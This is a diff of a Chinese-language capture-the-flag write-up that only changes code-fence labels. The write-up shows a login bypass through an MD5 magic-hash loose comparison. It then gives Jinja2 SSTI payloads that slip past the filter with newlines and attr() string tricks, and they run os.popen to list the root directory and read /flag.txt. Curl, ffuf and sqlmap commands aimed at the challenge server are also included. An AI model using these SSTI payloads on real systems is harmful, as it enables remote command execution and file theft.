@@ -8,7 +8,7 @@
 - 状态：已解
 
 ## Flag
-```
+```text
 novruzctf{Ch41n1ng_MD5_L00s3_C0mp4r1s0n_4nd_SSTI_w1th_N3w1ine_Byp4ss}
 ```
 
@@ -25,12 +25,12 @@ novruzctf{Ch41n1ng_MD5_L00s3_C0mp4r1s0n_4nd_SSTI_w1th_N3w1ine_Byp4ss}
 
 ### 2) 仪表盘发现 SSTI（Jinja2）
 仪表盘有 `Report Title` 表单，输入会回显在：
-```
+```text
 <h1>Report: {title}</h1>
 ```
 
 普通 `{{7*7}}` 被过滤，但加入换行可绕过：
-```
+```text
 {{
 7*7
 }}
@@ -43,13 +43,13 @@ novruzctf{Ch41n1ng_MD5_L00s3_C0mp4r1s0n_4nd_SSTI_w1th_N3w1ine_Byp4ss}
 - 使用 `attr()` 访问属性
 
 读取根目录验证：
-```
+```text
 {{
 ((cycler|attr("_"*2 ~ "init" ~ "_"*2)|attr("_"*2 ~ "globals" ~ "_"*2))["os"]).popen("ls /").read()
 }}
 ```
 看到 `/flag.txt` 后读取：
-```
+```text
 {{
 ((cycler|attr("_"*2 ~ "init" ~ "_"*2)|attr("_"*2 ~ "globals" ~ "_"*2))["os"]).popen("cat /flag.txt").read()
 }}
@@ -78,7 +78,7 @@ novruzctf{Ch41n1ng_MD5_L00s3_C0mp4r1s0n_4nd_SSTI_w1th_N3w1ine_Byp4ss}
 根据扩展计划，Web 题优先使用现成工具，Crypto 用自研工具包：
 
 1) **目录与端点发现（Web）** — `ffuf`
-```
+```text
 ffuf -u http://103.54.19.209/FUZZ -w /path/to/wordlist.txt -fc 404
 ```
 用于快速发现 `dashboard.php` 等隐藏页面。
@@ -88,13 +88,13 @@ ffuf -u http://103.54.19.209/FUZZ -w /path/to/wordlist.txt -fc 404
 - 在 Repeater 中批量测试 `{{...}}`、换行绕过、黑名单绕过等 payload
 
 3) **注入排查（Web）** — `SQLMap`（可选）
-```
+```text
 sqlmap -u "http://103.54.19.209/" --data "login=admin&pwd=test" --batch
 ```
 快速排除 SQL 注入方向，节省时间。
 
 4) **MD5 验证（Crypto，自研工具包）** — `ctf_tools/crypto`
-```
+```text
 cd ctf_tools/crypto
 # 构建后使用 hash 子命令验证 magic hash
 ./crypto_toolkit hash -a md5 -t "240610708"
@@ -116,14 +116,14 @@ cd ctf_tools/crypto
 ## 命令行提取关键数据（无 GUI）
 
 ### 1) 登录拿到 Cookie
-```
+```text
 curl -i -s -c cookies.txt \
   -d "login=admin&pwd=240610708" \
   http://103.54.19.209/
 ```
 
 ### 2) 生成可复用的 URL 编码 payload
-```
+```text
 python - <<'PY'
 import urllib.parse
 payload = """{{
@@ -134,7 +134,7 @@ PY
 ```
 
 ### 3) 发起请求并提取 flag
-```
+```text
 curl -s -b cookies.txt \
   -d "$(python - <<'PY'
 import urllib.parse
